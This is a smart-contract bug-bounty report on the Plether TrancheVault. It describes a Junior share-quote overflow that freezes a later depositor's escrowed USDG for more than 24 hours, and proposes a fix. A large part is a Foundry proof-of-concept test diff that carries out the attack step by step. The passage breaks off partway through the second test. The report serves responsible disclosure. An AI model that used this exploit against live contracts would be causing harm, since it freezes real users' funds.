# \#100008 [SC-High] A Junior share-quote overflow freezes matured deposit principal for more than 24 hours

**Submitted on Nov 16th 2026 at 02:30:18 UTC by @polymix123 for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #100008
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol
- **Impacts:**
  - Temporary freezing of funds for at least 24 hours

## Description

# A Junior share-quote overflow freezes matured deposit principal for more than 24 hours

## Brief/Intro

An attacker can repeatedly settle minimum Junior deposits while trader PnL returns Junior NAV to a tiny positive value, multiplying Junior share supply until the next deposit quote no longer fits in `uint256`. Instead of rejecting and refunding that deposit, the quote panics and rolls back the entire LP settlement call. If a non-seed Senior holder exits and a separate user then deposits into this near-wiped Junior tranche, that user's matured USDG can remain in vault escrow, uncancellable and unsettled, for more than 24 hours. The affected principal is temporarily frozen, not stolen.

## Vulnerability Details

`TrancheVault.quoteDepositFromState` computes the number of shares for a deposit from the current pricing supply and pricing assets:

```solidity
uint256 denominator = pricingAssets + assets + 1 - netAssets;
shares = Math.mulDiv(netAssets, pricingSupply + VIRTUAL_SHARES, denominator, Math.Rounding.Floor);
```

At the configured zero deposit fee, a minimum `1 USDG` deposit makes `denominator = pricingAssets + 1` in six-decimal USDG atoms. When Junior NAV is positive but far below `1 USDG`, each ordinary accepted deposit adds many shares. Repeated legitimate request, maturity, settlement, and claim cycles can therefore grow supply geometrically while trader PnL repeatedly brings Junior NAV back into the same small positive range. `Math.mulDiv` supports a 512-bit intermediate product; the failure here occurs when the **quotient itself** cannot fit in `uint256`. See [TrancheVault.sol lines 1398–1409](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L1398-L1409).

The request preflight checks minimum size and admission, but does not bound the future share quote or cumulative supply. The vault transfers the depositor's USDG into escrow immediately. At maturity, `HousePool._settleDepositPhase` calls `quoteDepositFromState` synchronously. Its zero-share rejection path runs only **after** a quote returns; an arithmetic panic bypasses that fail-soft path and leaves the head in the queue. See [TrancheVault.sol lines 577–600](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L577-L600), [lines 1574–1600](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L1574-L1600), and [HousePool.sol lines 1030–1067](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L1030-L1067).

Anyone can retry `OrderRouter.settleLpEpoch(bytes[])`; the Router mark update and Pool settlement share one rollback frame. Each retry reaches the same unrepresentable head and reverts with panic selector `0x4e487b71`. A later matured Junior deposit cannot advance past the head. Its owner also cannot cancel while Junior NAV remains positive and Senior is unimpaired; the post-maturity cancellation exceptions are unavailable. See [OrderRouter.sol lines 474–484](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouter.sol#L474-L484) and [TrancheVault.sol lines 833–874](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L833-L874).

The attached PoC applies to the audited commit as a test-only patch. It uses production V3 `commitOrder`/`executeOrder`, the public Router LP settlement path, actual vault request/claim/cancellation methods, six configured feed components through the repository's `MockPyth`, and release risk, fee, coupon, and admission parameters. Fifty-three successful `1 USDG` amplification epochs create the next-quote overflow. From that same state, a non-seed Senior holder makes an ordinary public redemption, leaving `1.002083 USDG` Senior principal. This exit is a necessary step in the demonstrated 24-hour duration, and the PoC does not assume that an independent Senior LP is compelled to take it. The attacker then queues the unrepresentable `1 USDG` Junior head. A separate victim deposits `2,000,000 USDG` behind it despite the Junior tranche's near-wiped NAV; that third-party deposit is another necessary event, not something the attacker can force. At **86,401 seconds after the victim's own maturity**, projected Junior NAV is still `0.065628 USDG`; the victim has received no refund, its full `2,000,000 USDG` remains pending, cancellation fails, and a fresh public settlement retry panics. The test directly checks that the exact matured quote also panics.

The control restores the identical pre-exit amplification state but keeps approximately `3,001.453967 USDG` Senior principal invested. Its coupon reduces Junior NAV to zero before the same 24-hour target, enabling the victim to cancel and recover all `2,000,000 USDG`. This isolates the Senior exit's effect on duration. The root is still the unhandled deposit-share overflow: a fail-soft rejection/refund of the unrepresentable head would remove both branches' queue blockage.

Apply and run the PoC using the [secret gist](https://gist.github.com/fuzious/f4aeb03a4d91388637e0e5f9f189b9d8), [M3_Junior_Quote_Overflow.patch](M3_Junior_Quote_Overflow.patch), and [README.md](README.md). In a fresh checkout of the pinned commit with its submodules initialized, a forced compile built `194` files with Solidity `0.8.35` and the test returned `1 passed; 0 failed`. It recorded `53` successful amplifications, `0.065628 USDG` projected Junior NAV at the attack target, and `86,401` seconds elapsed after victim maturity.

The same panic can roll back earlier otherwise fundable Senior redemption work in the coordinated settlement call because Senior redemptions are processed before Junior deposits. A Pool pause can defer deposit activation while still processing redemption, so that consequence is secondary; it does not release the blocked Junior deposit. A separate coupon-driven supply recurrence can also reach an unrepresentable cumulative mint after a single marked trade and twelve hourly deposits, but the demonstrated third-party freeze in that shorter trace is only about one second after the victim's maturity. Both routes have the same deposit representability defect and remedy. See [HousePool.sol lines 845–920](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L845-L920) and [TrancheVault.sol lines 1445–1474](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L1445-L1474).

## Impact Details

The affected asset is the victim's real USDG already transferred into Junior vault escrow at request time. The PoC demonstrates a **temporary freeze for more than 24 hours after that separate victim's deposit matures**, matching the program's listed High impact for temporary freezing of funds for at least 24 hours. The `2,000,000 USDG` figure is locked principal, not a claimed theft amount or priced damages. An unbounded or permanent freeze is not claimed: sufficiently large future coupon accrual can wipe projected Junior NAV and open cancellation, while owner recapitalization or positive Pool revenue can restore quote representability sooner.

The path is expensive and market dependent. The PoC's six-feed price history is **contract-accepted MockPyth data, not authenticated live Pyth publications**. It engineers many favorable moves and uses zero confidence values; therefore it proves the contract transition under those reports, not that an equivalent real publication sequence will occur. The demonstrated High-duration outcome further depends on a non-seed Senior holder exiting and an independent user placing a large deposit into near-wiped Junior. The test does not measure the chance of these events or price Arbitrum gas, live oracle fees, and market risk. Once that high-supply/low-positive-NAV state and queue are present, the quote panic and repeated blockage are deterministic. The attacker receives no victim funds. The trader's gain in the constructed market path is ordinary trade PnL, not an overflow payout.

The remedy is to bound **both** the deposit quote and `currentSupply + marginalShares` before minting. If either is unrepresentable, settle that epoch through the existing rejection and refund path and advance the queue without reverting the full coordinated pass. Request-time limits alone cannot close the issue because NAV and supply change before maturity.

## References

- [Audited repository at `a82d4fefb02768e5b3bddcc97dee371eee24fea8`](https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8)
- [Junior deposit quote and mint path](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L1398-L1474)
- [HousePool deposit phase](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L1030-L1097)


## Link to Proof of Concept

https://gist.github.com/fuzious/f4aeb03a4d91388637e0e5f9f189b9d8

## Proof of Concept

```diff
diff --git a/packages/perps/test/perps/BasePerpTest.sol b/packages/perps/test/perps/BasePerpTest.sol
index f322d21b..206e3191 100644
--- a/packages/perps/test/perps/BasePerpTest.sol
+++ b/packages/perps/test/perps/BasePerpTest.sol
@@ -272,25 +272,25 @@ abstract contract BasePerpTest is RecordedOrderReceipts {
         return address(this);
     }
 
-    function _basePythFeedIds() internal pure returns (bytes32[] memory feedIds) {
+    function _basePythFeedIds() internal pure virtual returns (bytes32[] memory feedIds) {
         feedIds = new bytes32[](2);
         feedIds[0] = BASE_PYTH_FEED_A;
         feedIds[1] = BASE_PYTH_FEED_B;
     }
 
-    function _basePythWeights() internal pure returns (uint256[] memory weights) {
+    function _basePythWeights() internal pure virtual returns (uint256[] memory weights) {
         weights = new uint256[](2);
         weights[0] = 0.5e18;
         weights[1] = 0.5e18;
     }
 
-    function _basePythBasePrices() internal pure returns (uint256[] memory basePrices) {
+    function _basePythBasePrices() internal pure virtual returns (uint256[] memory basePrices) {
         basePrices = new uint256[](2);
         basePrices[0] = 1e8;
         basePrices[1] = 1e8;
     }
 
-    function _basePythInversions() internal pure returns (bool[] memory inversions) {
+    function _basePythInversions() internal pure virtual returns (bool[] memory inversions) {
         inversions = new bool[](2);
     }
 
diff --git a/packages/perps/test/perps/M3JuniorOverflow.t.sol b/packages/perps/test/perps/M3JuniorOverflow.t.sol
new file mode 100644
index 00000000..fc2e9a24
--- /dev/null
+++ b/packages/perps/test/perps/M3JuniorOverflow.t.sol
@@ -0,0 +1,578 @@
+// SPDX-License-Identifier: AGPL-3.0
+pragma solidity 0.8.35;
+
+import {BasePerpTest} from "./BasePerpTest.sol";
+import {SafeCast} from "@openzeppelin/contracts/utils/math/SafeCast.sol";
+import {CfdTypes} from "@plether/perps/CfdTypes.sol";
+import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
+import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
+import {IOrderRouterAccounting} from "@plether/perps/interfaces/IOrderRouterAccounting.sol";
+import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
+import {MockPyth} from "@plether/test-utils/MockPyth.sol";
+import {console2} from "forge-std/console2.sol";
+
+/// @dev Six-release-feed reproduction using the production OrderRequest,
+///      executeOrder, and Router LP-settlement entry points. The inherited
+///      test adapter's legacy overload is never called and no protocol
+///      contract is impersonated.
+contract MW006PublicRouterReleaseTest is BasePerpTest {
+    address internal constant SENIOR_LP = address(0x510006);
+    address internal constant HONEST_JUNIOR_LP = address(0x610006);
+    address internal constant JUNIOR_ACTOR = address(0xA77006);
+    address internal constant TRADER = address(0x7AD006);
+    address internal constant KEEPER = address(0x7AD006);
+    address internal constant JUNIOR_VICTIM = address(0xB10006);
+
+    uint256 internal constant MIN_DEPOSIT = 1e6;
+    uint256 internal constant TRADE_SIZE = 1100e18;
+    uint256 internal constant OPEN_PRICE = 1e8;
+    uint256 internal constant TARGET_JUNIOR = 60_000;
+    uint256 internal constant CLOSE_FEE_ESTIMATE = 440_000;
+    uint256 internal constant YEAR = 31_536_000;
+
+    uint256 internal clientNonce;
+    uint256 internal queuedDepositId;
+    uint256 internal queuedVictimRedeemId;
+    bool internal queuedExpectedOverflow;
+
+    function _initialJuniorDeposit() internal pure override returns (uint256) { return 0; }
+    function _initialJuniorSeedDeposit() internal pure override returns (uint256) { return 1e6; }
+    function _initialSeniorSeedDeposit() internal pure override returns (uint256) { return 1e6; }
+
+    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
+        return CfdTypes.RiskParams({
+            vpiFactor: 0.01e18,
+            maxSkewRatio: 0.4e18,
+            maintMarginBps: 10,
+            initMarginBps: 20,
+            fadMarginBps: 300,
+            baseCarryBps: 500,
+            minBountyAssets: 1e6,
+            bountyBps: 10,
+            keeperShareBps: 5000,
+            protocolShareBps: 0
+        });
+    }
+
+    function _basePythFeedIds() internal pure override returns (bytes32[] memory ids) {
+        ids = new bytes32[](6);
+        for (uint256 i; i < 6; ++i) ids[i] = bytes32(i + 1);
+    }
+
+    function _basePythWeights() internal pure override returns (uint256[] memory weights) {
+        weights = new uint256[](6);
+        uint256[6] memory ws = [uint256(0.576e18), 0.136e18, 0.119e18, 0.091e18, 0.042e18, 0.036e18];
+        for (uint256 i; i < 6; ++i) weights[i] = ws[i];
+    }
+
+    function _basePythBasePrices() internal pure override returns (uint256[] memory bases) {
+        bases = new uint256[](6);
+        uint256[6] memory bs = [uint256(117_500_000), 638_000, 134_480_000, 72_880_000, 10_860_000, 126_100_000];
+        for (uint256 i; i < 6; ++i) bases[i] = bs[i];
+    }
+
+    function _basePythInversions() internal pure override returns (bool[] memory inversions) {
+        inversions = new bool[](6);
+        for (uint256 i; i < 6; ++i) inversions[i] = i == 1 || i >= 3;
+    }
+
+    function setUp() public override {
+        super.setUp();
+
+        IHousePool.PoolConfig memory pc = _currentPoolConfig();
+        pc.maxSeniorExposureAssets = 40_000_000e6;
+        pc.maxSeniorShareBps = 8000;
+        pool.proposePoolConfig(pc);
+
+        IOrderRouterAdminHost.RouterConfig memory rc = _routerConfig();
+        rc.orderExecutionStalenessLimit = 15;
+        rc.liquidationStalenessLimit = 15;
+        rc.basketMaxConfidenceRatioBps = 10;
+        rc.orderSettlementWindow = 15;
+        rc.maxComponentPublishTimeDivergence = 5;
+        rc.adverseConfidenceMultiplierBps = 2500;
+        rc.minOpenNotionalAssets = 1000e6;
+        rc.positionProtectionTriggerBountyAssets = 200_000;
+        rc.maxPendingOrders = 5;
+        routerAdmin.proposeRouterConfig(rc);
+
+        uint256 activation = pool.poolConfigActivationTime();
+        if (routerAdmin.routerConfigActivationTime() > activation) activation = routerAdmin.routerConfigActivationTime();
+        vm.warp(activation);
+        pool.finalizePoolConfig();
+        routerAdmin.finalizeRouterConfig();
+        _warpToNextMondayAtTen();
+
+        _fundTranchePublic(false, HONEST_JUNIOR_LP, 999e6);
+        _fundTranchePublic(true, SENIOR_LP, 2999e6);
+        assertEq(pool.seniorRateBps(), 800);
+        assertEq(pool.maxSeniorExposureAssets(), 40_000_000e6);
+        assertEq(pool.maxSeniorShareBps(), 8000);
+        assertEq(router.minOpenNotionalAssets(), 1000e6);
+        (
+            uint256 vpiFactor,
+            uint256 maxSkewRatio,
+            uint256 maintMarginBps,
+            uint256 initMarginBps,
+            uint256 fadMarginBps,
+            uint256 baseCarryBps,
+            ,,,
+        ) = engine.riskParams();
+        assertEq(vpiFactor, 0.01e18);
+        assertEq(maxSkewRatio, 0.4e18);
+        assertEq(maintMarginBps, 10);
+        assertEq(initMarginBps, 20);
+        assertEq(fadMarginBps, 300);
+        assertEq(baseCarryBps, 500);
+        assertEq(engine.executionFeeBps(), 4);
+        assertEq(engine.settlementBufferBps(), 25);
+        assertLe(pool.seniorPrincipal() * 10_000, (pool.seniorPrincipal() + pool.juniorPrincipal()) * 8000);
+        _fundTrader(TRADER, 1000e6);
+    }
+    function test_MW006_publicRouterSixFeedsReleaseParameters() public {
+        uint256 attackerTraderStart = clearinghouse.balanceAssets(TRADER);
+        _drainJuniorToTarget();
+        _queueNextDepositAndPossibleVictim();
+
+        uint256 successfulCycles;
+        uint256 supplyBeforeFailure;
+        uint256 seniorPrincipalBeforeFailure;
+        uint256 failedDepositId;
+        uint256 failedVictimId;
+
+        for (uint256 i; i < 96; ++i) {
+            vm.warp(juniorVault.depositEpochStart(queuedDepositId));
+            if (queuedExpectedOverflow) {
+                failedDepositId = queuedDepositId;
+                failedVictimId = queuedVictimRedeemId;
+                supplyBeforeFailure = juniorVault.totalSupply();
+                seniorPrincipalBeforeFailure = pool.seniorPrincipal();
+                (, uint256 exactPricingJunior) = pool.getPendingDepositTrancheState();
+                (bool quoteOk, bytes memory quoteErr) = address(juniorVault).staticcall(
+                    abi.encodeCall(
+                        juniorVault.quoteDepositFromState,
+                        (MIN_DEPOSIT, exactPricingJunior, juniorVault.accruedTotalSupply(), uint256(0))
+                    )
+                );
+                assertFalse(quoteOk);
+                assertEq(_selector(quoteErr), bytes4(0x4e487b71));
+                console2.log("exact Junior pricing assets", exactPricingJunior);
+                bytes[] memory data = _livePayload(OPEN_PRICE, OPEN_PRICE);
+                vm.prank(KEEPER);
+                (bool ok, bytes memory err) = address(router).call(abi.encodeCall(router.settleLpEpoch, (data)));
+                assertFalse(ok);
+                assertEq(_selector(err), bytes4(0x4e487b71));
+                break;
+            }
+
+            _settleLpPublic();
+            vm.prank(JUNIOR_ACTOR);
+            juniorVault.claimDeposit(queuedDepositId, MIN_DEPOSIT, JUNIOR_ACTOR, JUNIOR_ACTOR);
+            ++successfulCycles;
+
+            (uint256 nextEpoch,) = juniorVault.getRequestEpochWindow();
+            uint256 nextMaturity = juniorVault.depositEpochStart(nextEpoch);
+            uint256 elapsed = nextMaturity - pool.lastSeniorCouponCheckpointTime();
+            uint256 nextCoupon = (pool.seniorPrincipal() * pool.seniorRateBps() * elapsed) / (10_000 * YEAR);
+            uint256 grossProfit = pool.juniorPrincipal() - TARGET_JUNIOR - nextCoupon + CLOSE_FEE_ESTIMATE;
+            grossProfit -= grossProfit % 11;
+            _trade(TRADER, false, OPEN_PRICE);
+            _trade(TRADER, true, OPEN_PRICE - (grossProfit / 11));
+            _queueNextDepositAndPossibleVictim();
+        }
+
+        assertGt(successfulCycles, 20);
+        assertGt(failedDepositId, 0);
+        assertGt(failedVictimId, 0);
+        assertEq(juniorVault.totalSupply(), supplyBeforeFailure);
+        assertEq(pool.seniorPrincipal(), seniorPrincipalBeforeFailure);
+        assertGt(seniorVault.pendingRedeemRequest(failedVictimId, SENIOR_LP), 0);
+        assertGt(juniorVault.pendingDepositRequest(failedDepositId, JUNIOR_ACTOR), 0);
+
+        settlementToken.mint(JUNIOR_VICTIM, 100e6);
+        vm.startPrank(JUNIOR_VICTIM);
+        settlementToken.approve(address(juniorVault), 100e6);
+        uint256 victimDepositId = juniorVault.requestDeposit(100e6, JUNIOR_VICTIM, JUNIOR_VICTIM);
+        vm.stopPrank();
+        vm.warp(juniorVault.depositEpochStart(victimDepositId));
+        vm.prank(JUNIOR_VICTIM);
+        (bool cancelOk,) = address(juniorVault).call(
+            abi.encodeWithSignature(
+                "cancelPendingDeposit(uint256,address,address)", victimDepositId, JUNIOR_VICTIM, JUNIOR_VICTIM
+            )
+        );
+        assertFalse(cancelOk);
+
+        bytes[] memory retryData = _livePayload(OPEN_PRICE, OPEN_PRICE);
+        vm.prank(KEEPER);
+        (bool retryOk, bytes memory retryErr) = address(router).call(abi.encodeCall(router.settleLpEpoch, (retryData)));
+        assertFalse(retryOk);
+        assertEq(_selector(retryErr), bytes4(0x4e487b71));
+        assertGt(seniorVault.pendingRedeemRequest(failedVictimId, SENIOR_LP), 0);
+        assertEq(juniorVault.pendingDepositRequest(victimDepositId, JUNIOR_VICTIM), 100e6);
+
+        uint256 attackerTraderEnd = clearinghouse.balanceAssets(TRADER);
+        uint256 attackerDepositOutlay = (successfulCycles + 1) * MIN_DEPOSIT;
+        assertGt(attackerTraderEnd, attackerTraderStart + attackerDepositOutlay);
+        console2.log("attacker trader gain", attackerTraderEnd - attackerTraderStart);
+        console2.log("attacker poison-deposit outlay", attackerDepositOutlay);
+
+        settlementToken.mint(address(this), 1000e6);
+        settlementToken.approve(address(engine), 1000e6);
+        engine.recapitalizePool(1000e6);
+        _settleLpPublic();
+
+        console2.log("public successful cycles", successfulCycles);
+        console2.log("public supply before boundary", supplyBeforeFailure);
+    }
+
+    function _fundTranchePublic(bool senior, address lp, uint256 amount) internal {
+        settlementToken.mint(lp, amount);
+        vm.startPrank(lp);
+        settlementToken.approve(address(senior ? seniorVault : juniorVault), amount);
+        uint256 id = senior ? seniorVault.requestDeposit(amount, lp, lp) : juniorVault.requestDeposit(amount, lp, lp);
+        vm.stopPrank();
+        vm.warp((senior ? seniorVault : juniorVault).depositEpochStart(id));
+        _settleLpPublic();
+        vm.prank(lp);
+        if (senior) seniorVault.claimDeposit(id, amount, lp, lp);
+        else juniorVault.claimDeposit(id, amount, lp, lp);
+    }
+
+    function _settleLpPublic() internal {
+        bytes[] memory data = _livePayload(OPEN_PRICE, OPEN_PRICE);
+        vm.prank(KEEPER);
+        router.settleLpEpoch(data);
+    }
+
+    function _trade(address account, bool isClose, uint256 basketPrice) internal {
+        (uint256 currentSize,,,,,,) = engine.positions(account);
+        OrderV3Types.OrderRequest memory request;
+        request.clientOrderId = keccak256(abi.encode("mw006-public", ++clientNonce));
+        request.side = CfdTypes.Side.LONG;
+        request.sizeDelta = TRADE_SIZE;
+        request.marginDelta = isClose ? 0 : 25e6;
+        request.targetPrice = isClose ? type(uint256).max : 1;
+        request.isClose = isClose;
+        request.bounds = OrderV3Types.ExecutionBounds({
+            submitBy: uint64(block.timestamp + router.maxExecutionWindowSeconds()),
+            executionWindowSeconds: uint32(router.maxExecutionWindowSeconds()),
+            allowedExecutionModes: 7,
+            expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
+            maxExecutionBountyAssets: type(uint256).max,
+            maxExecutionNotionalAssets: type(uint256).max,
+            maxGrossAccountDebitAssets: type(uint256).max,
+            maxActionChargeAssets: type(uint256).max,
+            maxExplicitFeesAssets: type(uint256).max,
+            maxPostPositionSize: isClose ? currentSize - TRADE_SIZE : currentSize + TRADE_SIZE,
+            minPostSettlementBalanceAssets: 0,
+            minPostPositionEquityAssets: 0,
+            maxPostLeverageBps: type(uint32).max
+        });
+        vm.prank(account);
+        uint64 id = router.commitOrder(request);
+        (IOrderRouterAccounting.PendingOrderView memory pending,) = router.getPendingOrderView(id);
+        vm.roll(block.number + 1);
+        vm.warp(block.timestamp + 1);
+        bytes[] memory data = _payload(basketPrice, OPEN_PRICE, pending.commitTime + 1, pending.commitTime);
+        vm.prank(KEEPER);
+        OrderV3Types.ExecutionResult memory result = router.executeOrder(id, data);
+        if (uint8(result.status) != uint8(OrderV3Types.LifecycleStatus.Executed)) {
+            console2.log("failed order/status", id, uint8(result.status));
+            console2.log("failed pending/terminal", uint8(result.pendingReason), uint8(result.terminalReason));
+            console2.log("failed close/price", isClose ? 1 : 0, basketPrice);
+        }
+        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed));
+    }
+
+    function _queueNextDepositAndPossibleVictim() internal {
+        (uint256 nextEpoch,) = juniorVault.getRequestEpochWindow();
+        uint256 maturity = juniorVault.depositEpochStart(nextEpoch);
+        (uint256 projectedSenior, uint256 projectedJuniorNow) = pool.getPendingDepositTrancheState();
+        uint256 extraElapsed = maturity - block.timestamp;
+        uint256 extraCoupon = (projectedSenior * pool.seniorRateBps() * extraElapsed) / (10_000 * YEAR);
+        uint256 conservativePricingAssets = projectedJuniorNow > extraCoupon ? projectedJuniorNow - extraCoupon + 100 : 100;
+        uint256 supply = juniorVault.accruedTotalSupply();
+        bool quoteFits;
+        try juniorVault.quoteDepositFromState(MIN_DEPOSIT, conservativePricingAssets, supply, 0) returns (
+            uint256 shares
+        ) {
+            quoteFits = supply <= type(uint256).max - shares;
+        } catch {
+            quoteFits = false;
+        }
+
+        queuedVictimRedeemId = 0;
+        queuedExpectedOverflow = !quoteFits;
+        if (!quoteFits) {
+            uint256 redeemShares = seniorVault.maxRequestRedeem(SENIOR_LP) / 1000;
+            vm.prank(SENIOR_LP);
+            queuedVictimRedeemId = seniorVault.requestRedeem(redeemShares, SENIOR_LP, SENIOR_LP);
+            assertEq(queuedVictimRedeemId, nextEpoch);
+        }
+
+        settlementToken.mint(JUNIOR_ACTOR, MIN_DEPOSIT);
+        vm.startPrank(JUNIOR_ACTOR);
+        settlementToken.approve(address(juniorVault), MIN_DEPOSIT);
+        queuedDepositId = juniorVault.requestDeposit(MIN_DEPOSIT, JUNIOR_ACTOR, JUNIOR_ACTOR);
+        vm.stopPrank();
+        assertEq(queuedDepositId, nextEpoch);
+    }
+
+    function _drainJuniorToTarget() internal {
+        for (uint256 i; i < 128; ++i) {
+            (, uint256 projectedJunior) = pool.getPendingDepositTrancheState();
+            if (projectedJunior <= TARGET_JUNIOR + 5_000) return;
+            uint256 grossProfit = projectedJunior - TARGET_JUNIOR + CLOSE_FEE_ESTIMATE;
+            if (grossProfit > 10e6) grossProfit = 10e6;
+            grossProfit -= grossProfit % 11;
+            _trade(TRADER, false, OPEN_PRICE);
+            _trade(TRADER, true, OPEN_PRICE - (grossProfit / 11));
+        }
+        revert("Junior drain did not converge");
+    }
+
+    function _livePayload(uint256 numerator, uint256 denominator) internal returns (bytes[] memory data) {
+        vm.roll(block.number + 1);
+        vm.warp(block.timestamp + 1);
+        uint64 tick = uint64(block.timestamp);
+        return _payload(numerator, denominator, tick, tick - 1);
+    }
+
+    function _payload(uint256 numerator, uint256 denominator, uint64 publishTime, uint64 previousTime)
+        internal
+        pure
+        returns (bytes[] memory data)
+    {
+        bytes32[] memory ids = _basePythFeedIds();
+        uint256[] memory bases = _basePythBasePrices();
+        MockPyth.FeedUpdate[] memory updates = new MockPyth.FeedUpdate[](6);
+        for (uint256 i; i < 6; ++i) {
+            bool inverted = i == 1 || i >= 3;
+            uint256 raw = inverted
+                ? (1e16 * denominator) / (bases[i] * numerator)
+                : (bases[i] * numerator) / denominator;
+            updates[i] = MockPyth.FeedUpdate(
+                ids[i], MockPyth.MockPrice(SafeCast.toInt64(SafeCast.toInt256(raw)), 0, -8, publishTime, previousTime)
+            );
+        }
+        data = new bytes[](1);
+        data[0] = abi.encode(updates);
+    }
+
+    function _warpToNextMondayAtTen() internal {
+        uint256 day = block.timestamp / 1 days;
+        uint256 target = day * 1 days + 10 hours;
+        if (target <= block.timestamp) ++day;
+        while ((day + 4) % 7 != 1) ++day;
+        vm.warp(day * 1 days + 10 hours);
+    }
+
+    function _selector(bytes memory err) internal pure returns (bytes4 selector) {
+        if (err.length < 4) return bytes4(0);
+        assembly ("memory-safe") { selector := mload(add(err, 32)) }
+    }
+}
+
+/// @notice Same-root M3 duration escalation.
+/// @dev Reaches the accepted release-configured MW-006 supply boundary, then
+///      compares one changed transition before queueing the poisoned deposit:
+///      the attack branch publicly redeems the non-seed Senior position, while
+///      the control leaves it invested.  The permanent one-USDG Senior seed
+///      accrues only about nine token atoms of coupon per hour, so Junior stays
+///      positive for more than 24 hours and neither the poisoned head nor a
+///      later victim can cancel.  In the control, the 3,000-USDG Senior base
+///      consumes the Junior dust and opens the projected-wipe cancellation.
+contract M3SeniorSeedDurationEscalationTest is MW006PublicRouterReleaseTest {
+    struct BranchResult {
+        uint256 poisonId;
+        uint256 victimId;
+        uint256 poisonFailureTime;
+        uint256 victimMaturity;
+        uint256 targetTime;
+        uint256 projectedJuniorAtTarget;
+        uint256 seniorPrincipal;
+        uint256 seniorHwm;
+        uint256 supply;
+        bool victimCancelSucceeded;
+        bool retryPanicked;
+    }
+
+    function test_M3_SeniorExitLeavesVictimFrozenBeyond24Hours_ControlSelfHeals() public {
+        uint256 successfulAmplifications = _reachNextDepositOverflowWithoutQueueingIt();
+        assertGt(successfulAmplifications, 20, "amplification history must be nontrivial");
+
+        uint256 supplyAtBoundary = juniorVault.totalSupply();
+        uint256 preBranchJunior = pool.juniorPrincipal();
+        uint256 preBranchSenior = pool.seniorPrincipal();
+        assertGt(preBranchSenior, 2_999e6, "release Senior base must still be present");
+        assertGt(preBranchJunior, 0, "Junior must remain small-positive");
+
+        uint256 snapshot = vm.snapshotState();
+
+        // Attack branch: the ordinary Senior LP exits every non-seed share
+        // before the poisoned Junior request is queued.
+        uint256 seniorExitShares = seniorVault.maxRequestRedeem(SENIOR_LP);
+        assertGt(seniorExitShares, 0, "non-seed Senior ownership must be redeemable");
+        vm.prank(SENIOR_LP);
+        uint256 seniorExitId = seniorVault.requestRedeem(seniorExitShares, SENIOR_LP, SENIOR_LP);
+        uint256 branchEpochTime = pool.lpEpochStart(seniorExitId);
+        vm.warp(branchEpochTime);
+        _settleLpPublic();
+        uint256 seniorClaimable = seniorVault.claimableRedeemRequest(seniorExitId, SENIOR_LP);
+        assertEq(seniorClaimable, seniorExitShares, "full non-seed Senior request must fund");
+        vm.prank(SENIOR_LP);
+        seniorVault.claimRedeem(seniorExitId, seniorClaimable, SENIOR_LP, SENIOR_LP);
+
+        assertLt(pool.seniorPrincipal(), 2e6, "only the permanent Senior seed should remain");
+        assertLt(pool.seniorHighWaterMark(), 2e6, "Senior HWM should scale with the exit");
+
+        BranchResult memory attack = _runPoisonAndVictimBranch();
+        assertEq(attack.supply, supplyAtBoundary, "failed settlements cannot change amplified supply");
+        assertGt(attack.projectedJuniorAtTarget, 0, "seed coupon must not wipe Junior in 24h");
+        assertFalse(attack.victimCancelSucceeded, "matured victim escrow must remain non-cancellable");
+        assertTrue(attack.retryPanicked, "same overflow must persist beyond 24h");
+        assertEq(
+            juniorVault.pendingDepositRequest(attack.victimId, JUNIOR_VICTIM),
+            2_000_000e6,
+            "victim principal must remain in vault escrow"
+        );
+        assertEq(settlementToken.balanceOf(JUNIOR_VICTIM), 0, "victim must not receive a refund");
+        assertGt(
+            attack.targetTime - attack.victimMaturity,
+            24 hours,
+            "victim-specific post-maturity duration must exceed 24h"
+        );
+
+        // No-exit control: restore the exact pre-exit boundary and leave the
+        // 3,000-USDG Senior base invested.  Its release coupon wipes the dust
+        // before the 24h target, so the victim can use the projected-terminal-
+        // wipe cancellation.  Its request windows are one epoch later because
+        // the attack branch's Senior redemption itself advanced the LP epoch.
+        vm.revertToState(snapshot);
+        BranchResult memory control = _runPoisonAndVictimBranch();
+        assertEq(control.supply, supplyAtBoundary, "control starts at identical amplified supply");
+        assertEq(control.projectedJuniorAtTarget, 0, "large Senior coupon should wipe control Junior");
+        assertTrue(control.victimCancelSucceeded, "control victim must recover escrow after projected wipe");
+        assertEq(juniorVault.pendingDepositRequest(control.victimId, JUNIOR_VICTIM), 0);
+        assertEq(settlementToken.balanceOf(JUNIOR_VICTIM), 2_000_000e6, "control refunds victim principal");
+        assertFalse(control.retryPanicked, "control does not need a retry after victim cancellation");
+
